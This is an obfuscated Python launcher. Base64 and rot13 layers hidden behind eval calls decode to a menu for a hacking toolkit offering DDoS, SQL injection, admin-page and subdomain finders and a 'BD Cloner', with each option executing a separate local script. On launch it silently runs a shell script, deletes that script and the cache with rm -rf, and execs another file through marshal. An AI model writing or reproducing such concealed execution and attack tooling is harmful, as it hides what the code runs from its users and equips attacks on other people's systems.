#################
 

import base64, codecs
magic = 'CmltcG9ydCBvcyx0aW1lLHN5cyxtYXJzaGFsCgojVGV4dCBjb2xvdXIKI2NyZWF0ZWQgQnkgQ3JhY2tlcjkxMTE4MQpjb2xvdXJvZmY9Ilx4MWJbMDBtIiAjY29sb3VyIG9mZgoKcmVkPSJceDFiWzkxbSIgI3JlZApncmVlbj0iXHgxYls5Mm0iICNncmVlbgp5ZWxsb3c9Ilx4MWJbOTNtIiAjeWVsbG93CmJsdWU9Ilx4MWJbOTRtIiAjYmx1ZQpyb3N5PSJceDFiWzk1bSIgI3Jvc3kKcGVzdD0iXHgxYls5Nm0iICNwZXN0CgoKIyMjIyMjIyMjIyMjIyMjIyMjIyMKCm9zLnN5c3RlbSgic2ggcmVxdWlyZW1lbnQuc2giKQpvcy5zeXN0ZW0oInJtIC1yZiByZXF1aXJlbWVudC5zaCIpCm9zLnN5c3RlbSgicm0gLXJmIF9fcHljYWNoZV9fIikKCiMjIyMjIyMjIyMjIyMjIyMjIyMjIwoKZXhlYyhtYXJzaGFsLmxvYWRzKGInXHhmYSZvcHA9b3BlbigibGcucHkiLCJyIilcbmV4ZWMob3BwLnJlYWQoKSknKSkKCiMjIyMjIyMjIyMjIyMjIyMjIyMjIwoKZGVmIHZvaWNlKCk6Cgl0ZXh0PXN0cihpbnB1dChyb3N5KyJcbkVudGVyIFlvdXIgVGV4dDogIikpCgl3aGlsZSBUcnVlOgoJCWxhbj1zdHIoaW5wdXQocm9zeSsiXG5FbnRlciBZb3VyIExhbmd1YWdlKGV4YW1wbGU6ICdlbi9ibicpOiAiKSkKCQlpZiBsYW49PSIiIG9yIGxhbj09IiAiOgoJCQlwcmludChyZWQrIlxuXG5cdExhbmd1YWdlIE5vdCBEZW5pZWQiKQoJCWVsc2U6CgkJCXZvaWNlPWdUVFModGV4dD10ZXh0LGxhbmc9bGFuKQoJCQlmaWxlPXN0cihpbnB1dCgiXG5FbnRlciBZb3VyIEZpbGUgTmFtZSBGb3Igc2F2aW5nKGV4YW1wbGU6IHRlc3QubXAzKTogIikpCgkJCXdoaWxlIFRydWU6CgkJCQlwYXRoPXN0cihpbnB1dChyb3N5KyJcbkVudGVyIFlvdXIgU2F2aW5nIFBhdGg6ICIpKQoJCQkJaWYgcGF0aD09IiIgb3IgcGF0aD09IiAiOgoJCQkJCXByaW50KHJlZCsiXG5cblx0UGF0aCBOb3QgRGVuaWVkIikKCQkJCWVsc2U6CgkJCQkJbW5wdD1zdHIocGF0aCsiLyIrZmlsZSkKCQkJCQl2b2ljZS5zYXZlKG1ucHQpCgp3aGlsZSBUcnVlOgoJb3Muc3lzdGVtKCdjbGVhcicpCglwcmludChibHVlK2YiIiIKICAgX19fXyAgICAgICAgICAgICAgICBfICAgICAgICAgICAgICAgIF9fX19fICAgICAgICAgICBfCiAgLyBfX198XyBfXyBfXyBfICBfX198IHwgX19fX18gXyBfXyAgIHxfICAgX3'
love = 'ksKlNtVS9sKlO8VUjXVPVvVvgvoUIyXlVvVajtsPNtVUjtW19sYlOsLPO8YlOsK3jtsP8tYlOsVSjtW19ssS9sK198VUjiVS8tKPNiVS8tKUjtsNbtVvVvX3Oyp3DeVvVvsPO8K19ssPO8VUjtXS98VUjtXS9ssPNtVQjtVS9sYlO8VUksK19sK3jtsPNbKlxtsPNbKlxtsPO8PvNtKS9sK198K3jtVSksKlkssSksK198K3kpK1ksK198K3jtVPNtVPNtsS98KS9sKl8tKS9sKl98K3kpoykhVPVvVvgapzIyovfvVvVtVPNtVPNtVPNtVPNtD3WuL2ftJJ91pvOKo3WfMPjtFJLtJJ91VRAuoykhKT5pqPNtVPNtVPNtVPNtVvVvX2WfqJHeVvVvJ+XLuI0tITI4qPOHolOJo2ywMFOo4cvSKFOpovVvVvgapzIyovfvVvVtCG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09VvVvX2AioT91pz9zMvxXVNc3nTyfMFOHpaIyBtbWo3Zhp3ymqTIgXPqwoTIupvpcPtyjpzyhqPuvoUIyX2LvVvVXVPNtK19sKlNtVPNtVPNtVPNtVPNtVPOsVPNtVPNtVPNtVPNtVPNtVS9sK19sVPNtVPNtVPNtVPOsPvNtYlOsK198KlOsKlOsKlOsVPOsK198VUjtK19sK18tKlOsKlNtVUksVPNtK3ksKlNtVS9sKlO8VUjXVPVvVvgvoUIyXlVvVajtsPNtVUjtW19sYlOsLPO8YlOsK3jtsP8tYlOsVSjtW19ssS9sK198VUjiVS8tKPNiVS8tKUjtsNbtVvVvX3Oyp3DeVvVvsPO8K19ssPO8VUjtXS98VUjtXS9ssPNtVQjtVS9sYlO8VUksK19sK3jtsPNbKlxtsPNbKlxtsPO8PvNtKS9sK198K3jtVSksKlkssSksK198K3kpK1ksK198K3jtVPNtVPNtsS98KS9sKl8tKS9sKl98K3kpoykhVPVvVvgapzIyovfvVvVtVPNtVPNtVPNtVPNtD3WuL2ftJJ91pvOKo3WfMPjtFJLtJJ91VRAuoykhKT5pqSk0VPNtVPNtVvVvX3yyoTkiqlfvVvWJMKWmnJ9hBvVvVvglMJDeVvVvZF4lVvVvX2AioT91pz9zMvxXPDbWL2uio3AyCKA0pvucoaO1qPujMKA0XlVvVykhPyk0sQ09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09sNcpqUjvVvVerJIfoT93XlVvVvNkYxAioaEuL3DtFJ5zolVvVvgjMKA0XlVvVvNtVQVhFINtIT9ioPNtVPNtVPNtVPNtsNcpqUjtZl5RMT9mVRS0qTSwnlNtVPN0YyA1LzEioJScovOGL2ShozIlVUjXKUE8VQHhDJEgnJ4tEzyhMTIlVPNtAv5VLKZtD3WuL2gypvNtVPNtVPO8Pyk0sPN3YyMcMTIiVREiq25fo2Sx'
god = 'ZXIgICA4LkJEIENsb25lciAgICAgfApcdHwgOS5TUUwtSW5qZWN0aW9uICAxMC5UZXh0IFRvIFZvaWNlICAgIHwKXHR8ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB8Clx0fCAgICAgICAgICAgICIiIityZWQrIiIiICA5OS5FeGl0IiIiK3Blc3QrIiIiICAgICAgICAgICAgICAgICB8Clx0fD09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09fApcbiIiIityb3N5KyIiIkVudGVyIFlvdXIgT3B0aW9uOiAiIiIpKQoKCQoJaWYgY2hvb3NlPT0iOTkiOgoJCW9zLnN5c3RlbSgiY2xlYXIiKQoJCXByaW50KHllbGxvdysiXG5cblxuXG5cblxuXHRcdPCfpKlUaGFua3MgRm9yIFVzaW5nIE15IFRvb2zwn6SpICAgXG5cblxuIikKCQlzeXMuZXhpdCgpCgkKCQoJZWxpZiBjaG9vc2U9PSIxIjoKCQlvcy5zeXN0ZW0oJ2NsZWFyJykKCQlwcmludChibHVlK2YiIiJcbgogICAgIHw9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT18CiAgICAgfCAgICAgICAgICAgICAgICAgICBPV05FUiBJTkZPICAgICAgICAgICAgICAgICAgICAgIHwKICAgICB8PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09fAogICAgIHwgRmFjZWJvb2sgfCBodHRwczovL3d3dy5mYWNlYm9vay5jb20vY3JhY2tlcjkxMTE4MSB8CiAgICAgfCBUZWxlZ3JhbSB8IGh0dHBzOi8vdC5tZS9jcmFja2VyOTExMTgxICAgICAgICAgICAgIHwKICAgICB8IEdpdEh1YiAgIHwgaHR0cHM6Ly9naXRodWIuY29tL2NyYWNrZXI5MTExODEgICAgICAgfAogICAgIHw9PT09PT09PT09fD09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT18CiIiIikKCQoJCXRpbWUuc2xlZXAoNykKCQoJZWxpZiBjaG9vc2U9PSIyIjoKCQlvbz1vcGVuKCJpcC5weSIsInIiKQoJCWV4ZWMob28ucmVhZCgpKQoJCgllbGlmIGNob29zZT09IjMiOgoJCW9vPW9wZW4oImRkb3MucHkiLCJyIikKCQlleGVjKG9vLnJlYWQoKSkKCQoJZWxpZiBjaG9vc2U9PSI0IjoKCQlvbz1vcGVuKCJzdWJkbS5weSIsInIiKQoJCWV4ZWMob28ucmVhZCgpKQoJCgllbGlmIGNob29zZT09IjUiOgoJCW9vPW9wZW4oImFkbWluLnB5IiwiciIpCgkJZXhlYyhvby5yZWFkKCkpCgkKCWVsaWYgY2hvb3'
destiny = 'AyCG0vAvV6PtxWo289o3OyovtvnTSmYaO5VvjvpvVcPtxWMKuyLluiol5lMJSxXPxcPtxXPJIfnJLtL2uio3AyCG0vAlV6PtxWo289o3OyovtvMT93ozkxYaO5VvjvpvVcPtxWMKuyLluiol5lMJSxXPxcPtxXPJIfnJLtL2uio3AyCG0vBPV6PtxWo289o3OyovtvL2kiozHhpUxvYPWlVvxXPDyyrTIwXT9iYaWyLJDbXFxXPDbWMJkcMvOwnT9ip2H9CFV5VwbXPDyiom1ipTIhXPWmpJjgoJ4hpUxvYPWlVvxXPDyyrTIwXT9iYaWyLJDbXFxXPDbWMJkcMvOwnT9ip2H9CFVkZPV6PtxWMaWioFOaqUEmVTygpT9lqPOaISEGPtxWq2ucoTHtIUW1MGbXPDxWo3Zhp3ymqTIgXPqwoTIupvpcPtxWPKOlnJ50XTWfqJHeMvVvVtbWPFNtVS9sK18tVPNtVPNtVPNtVPNtVPNtKlNtVPNtVPNtVPNtVPNtVPOsK19sKlNtVPNtVPNtVPNtKjbWPFNtYlOsK198KlOsKlOsKlOsVPOsK198VUjtK19sK18tKlOsKlNtVUksVPNtK3ksKlNtVS9sKlO8VUjXPDxtVvVvX2WfqJHeVvVvsPO8VPNtsPNaK18iVS9tVUjiVS9ssPO8YlNiVS8tKPNaK198K19sK3jtsP8tKlOpVP8tKlOpsPO8PtxWVPVvVvgjMKA0XlVvVajtsS9sK3jtsPO8VPussPO8VPusK3jtVPN8VPOsKl8tsPO8K19sK198VUjtXS8cVUjtXS8cVUjtsNbWPFNtKS9sK198K3jtVSksKlkssSksK198K3kpK1ksK198K3jtVPNtVPNtsS98KS9sKl8tKS9sKl98K3kpoykhVPVvVvgapzIyovfvVvVtVPNtVPNtVPNtVPNtD3WuL2ftJJ91pvOKo3WfMPjtFJLtJJ91VRAuoykhKT5pqPNtVPNtVPNtVPNtVvVvX2WfqJHeVvVvJ+XLuI0tITI4qPOHolOJo2ywMFOo4cvSKFOpovVvVvgapzIyovfvVvVtCG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09VvVvX2AioT91pz9zMvxXPDxXPDxWL2uip2H9p3ElXTyhpUI0XUOyp3DeVykhKT5pqSk0ZF4tD29hqzIlqPOHMKu0VSEiVSMinJAyKT5pqSk0VvglMJDeVwNjYxWuL2ftIT8tFT9gMIkhKT4vX3Wip3xeVxIhqTIlVSyiqKVtG3O0nJ9hBvNvXFxXPDxWnJLtL2uip2H9CFVkVwbXPDxWPKOlnJ50XTWfqJHeVykhKUEoX10tH3EipzSaMFODMKWgnKAmnJ9hVT5yMJEyMPVcPtxWPDyipl5mrKA0MJ0bVaEypz11rP1mMKE1pP1mqT9lLJqyVvxXPDxWPKMinJAyXPxXPDxWPtxWPJIfnJLtL2uip2H9CFVjZPV6PtxWPDyvpzIunj=='
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
